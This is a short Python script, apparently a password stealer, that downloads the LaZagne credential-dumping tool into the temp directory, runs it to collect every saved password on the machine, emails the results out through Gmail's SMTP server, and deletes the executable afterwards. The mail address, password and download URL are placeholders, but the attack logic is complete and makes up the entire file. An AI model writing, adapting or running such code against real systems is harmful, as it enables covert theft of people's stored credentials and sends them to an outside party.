
import requests
import smtplib
import subprocess
import os
import tempfile

def download(url):
	response = requests.get(url)
	filename = url.split("/")[-1]
	with open(filename, "wb") as output_file:
		output_file.write(response.content)

def sendMail(email, passwd, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, passwd)
	server.sendmail(email, email, message)
	server.quit()


tempDirectory = tempfile.gettempdir()
os.chdir(tempDirectory)
download("LaZagne.exe location")
result = subprocess.check_output("LaZagne.exe all", shell=True)
sendMail(<mail>, <passwd>, result)
os.remove("LaZagne.exe")